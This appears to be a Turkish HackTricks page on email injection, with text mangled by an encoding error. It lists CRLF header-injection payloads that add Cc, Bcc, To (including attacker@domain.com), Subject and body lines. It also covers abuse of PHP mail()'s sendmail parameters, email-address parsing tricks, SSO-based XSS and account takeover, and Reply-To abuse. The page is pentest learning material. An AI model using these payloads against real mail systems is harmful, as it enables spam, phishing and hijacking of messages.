# E-posta EnjeksiyonlarÄ±

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek PR'ler aracÄ±lÄ±ÄŸÄ±yla** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## GÃ¶nderilen e-postaya enjekte edin

### GÃ¶nderen argÃ¼manÄ±ndan sonra Cc ve Bcc enjekte edin
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
### Enjeksiyon argÃ¼manÄ±

Mesaj alÄ±cÄ± ve alÄ±cÄ±1 hesaplarÄ±na gÃ¶nderilecektir.
```
From:sender@domain.com%0ATo:attacker@domain.com
```
### Konu argÃ¼manÄ± enjekte edilir

Mesaj orijinal alÄ±cÄ±ya ve saldÄ±rgan hesaba gÃ¶nderilecektir.
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### MesajÄ±n gÃ¶vdesini deÄŸiÅŸtirin

Ä°ki satÄ±r boÅŸluk ekleyin, ardÄ±ndan mesajÄ±nÄ±zÄ± yazÄ±n ve mesajÄ±n gÃ¶vdesini deÄŸiÅŸtirin.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() fonksiyonu istismarÄ±
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5. Parametre ($additional\_parameters)

Bu bÃ¶lÃ¼m, **saldÄ±rganÄ±n kontrol ettiÄŸi varsayÄ±lan bu parametreyi nasÄ±l kÃ¶tÃ¼ye kullanabileceÄŸine** odaklanacaktÄ±r.

Bu parametre, PHP'nin, **ek parametrelerin sendmail iÃ§in kullanÄ±lacaÄŸÄ± komut satÄ±rÄ±na eklenecektir**. Bununla birlikte, bu parametre, `escapeshellcmd($additional_parameters)` iÅŸlevi ile temizlenecektir.

Bir saldÄ±rgan bu durumda **sendmail iÃ§in ek parametreler enjekte edebilir**.

#### /usr/sbin/sendmail uygulamasÄ±ndaki farklÄ±lÄ±klar

**sendmail** arayÃ¼zÃ¼, sistemde yÃ¼klÃ¼ olan MTA e-posta yazÄ±lÄ±mÄ± (Sendmail, Postfix, Exim vb.) tarafÄ±ndan **saÄŸlanmaktadÄ±r**. Temel iÅŸlevsellik (-t -i -f parametreleri gibi) uyumluluk nedeniyle **aynÄ± kalÄ±rken**, **diÄŸer iÅŸlevler ve parametreler** yÃ¼klÃ¼ MTA'ya baÄŸlÄ± olarak bÃ¼yÃ¼k Ã¶lÃ§Ã¼de deÄŸiÅŸmektedir.

Ä°ÅŸte sendmail komutu/arayÃ¼zÃ¼nÃ¼n farklÄ± man sayfalarÄ±na Ã¶rnekler:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

**Sendmail'in kÃ¶kenine** baÄŸlÄ± olarak, bunlarÄ± kÃ¶tÃ¼ye kullanmak ve **dosyalarÄ± sÄ±zdÄ±rmak veya hatta keyfi komutlar yÃ¼rÃ¼tmek** iÃ§in farklÄ± seÃ§enekler keÅŸfedilmiÅŸtir. NasÄ±l yapÄ±ldÄ±ÄŸÄ±nÄ± kontrol edin [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## E-posta adÄ±na enjekte et

### E-postanÄ±n ihmal edilen kÄ±sÄ±mlarÄ±

**+, -** ve **{}** sembolleri nadir durumlarda etiketleme iÃ§in kullanÄ±labilir ve Ã§oÄŸu e-posta sunucusu tarafÄ±ndan **ihmal edilir**.

* Ã–rn. john.doe+intigriti@example.com â†’ john.doe@example.com

Parantezler arasÄ±ndaki yorumlar () hem baÅŸta hem de sonda **ihmal edilecektir**.

* Ã–rn. john.doe(intigriti)@example.com â†’ john.doe@example.com

### Beyaz liste atlatma

<figure><img src="../.gitbook/assets/image (809).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### AlÄ±ntÄ±lar

<figure><img src="../.gitbook/assets/image (623).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP'ler

Kare parantezler arasÄ±nda alan adÄ± olarak IP'leri de kullanabilirsiniz:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### DiÄŸer zafiyetler

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1128).png>)

## ÃœÃ§Ã¼ncÃ¼ Taraf SSO

### XSS

**Github** veya **salesforce** gibi bazÄ± hizmetler, **XSS yÃ¼kleri iÃ§eren bir e-posta adresi oluÅŸturmanÄ±za izin verir**. Bu saÄŸlayÄ±cÄ±larÄ± **baÅŸka hizmetlere giriÅŸ yapmak iÃ§in kullanabilir** ve bu hizmetler **e-postayÄ± doÄŸru bir ÅŸekilde temizlemiyorsa**, **XSS** oluÅŸturabilirsiniz.

### Hesap Ele GeÃ§irme

Bir **SSO hizmeti**, verilen e-posta adresini doÄŸrulamadan bir hesap oluÅŸturmanÄ±za izin veriyorsa (Ã¶rneÄŸin **salesforce**) ve daha sonra bu hesabÄ± **salesforce'a gÃ¼venen baÅŸka bir hizmete giriÅŸ yapmak iÃ§in kullanabilirseniz**, herhangi bir hesaba eriÅŸebilirsiniz.\
_Salesforce, verilen e-postanÄ±n doÄŸrulanÄ±p doÄŸrulanmadÄ±ÄŸÄ±nÄ± belirtir ancak uygulama bu bilgiyi dikkate almalÄ±dÄ±r._

## YanÄ±t Adresi

_E-posta gÃ¶nderirken_ _**Kimden: sirket.com**_ _ve_ _**YanÄ±tla: saldÄ±rgan.com**_ _kullanarak bir e-posta gÃ¶nderebilir ve eÄŸer e-posta, iÃ§ adresinden gÃ¶nderildiÄŸi iÃ§in otomatik bir yanÄ±t gÃ¶nderilirse_, **saldÄ±rgan** o **yanÄ±tÄ± alabilir**.

## Sert Geri DÃ¶nÃ¼ÅŸ OranÄ±

AWS gibi belirli hizmetler, genellikle %10 olarak belirlenen bir eÅŸik olan **Sert Geri DÃ¶nÃ¼ÅŸ OranÄ±**nÄ± uygular. Bu, Ã¶zellikle e-posta teslimat hizmetleri iÃ§in kritik bir metriktir. Bu oran aÅŸÄ±ldÄ±ÄŸÄ±nda, AWS'nin e-posta hizmeti gibi bir hizmet, e-posta gÃ¶nderme yeteneklerinizi askÄ±ya alabilir veya engelleyebilir.

**Sert geri dÃ¶nÃ¼ÅŸ**, alÄ±cÄ±nÄ±n adresinin geÃ§ersiz veya mevcut olmamasÄ± nedeniyle gÃ¶nderene geri dÃ¶ndÃ¼rÃ¼len bir e-postayÄ± ifade eder. Bu, e-postanÄ±n mevcut olmayan bir adrese, gerÃ§ek olmayan bir alan adÄ±na veya alÄ±cÄ±nÄ±n sunucusunun e-postalarÄ± kabul etmeyi reddetmesi gibi Ã§eÅŸitli nedenlerden kaynaklanabilir.

AWS baÄŸlamÄ±nda, 1000 e-posta gÃ¶nderirseniz ve bunlardan 100'Ã¼ sert geri dÃ¶nÃ¼ÅŸlerle sonuÃ§lanÄ±rsa (geÃ§ersiz adresler veya alanlar gibi nedenlerden dolayÄ±), bu %10'luk bir sert geri dÃ¶nÃ¼ÅŸ oranÄ± anlamÄ±na gelir. Bu oranÄ± aÅŸmak, AWS SES (Basit E-posta Hizmeti) hizmetini e-posta gÃ¶nderme yeteneklerinizi engellemek veya askÄ±ya almak iÃ§in tetikleyebilir.

Kesintisiz e-posta hizmetini saÄŸlamak ve gÃ¶nderen itibarÄ±nÄ± korumak iÃ§in dÃ¼ÅŸÃ¼k bir sert geri dÃ¶nÃ¼ÅŸ oranÄ±nÄ± korumak son derece Ã¶nemlidir. Posta listelerinizdeki e-posta adreslerinin kalitesini izlemek ve yÃ¶netmek, bunu baÅŸarmada Ã¶nemli Ã¶lÃ§Ã¼de yardÄ±mcÄ± olabilir.

Daha detaylÄ± bilgi iÃ§in, AWS'nin sert geri dÃ¶nÃ¼ÅŸler ve ÅŸikayetlerle baÅŸa Ã§Ä±kma konusundaki resmi belgelerine baÅŸvurulabilir [AWS SES Geri DÃ¶nÃ¼ÅŸ Ä°ÅŸleme](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Referanslar

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerine gÃ¶z atÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
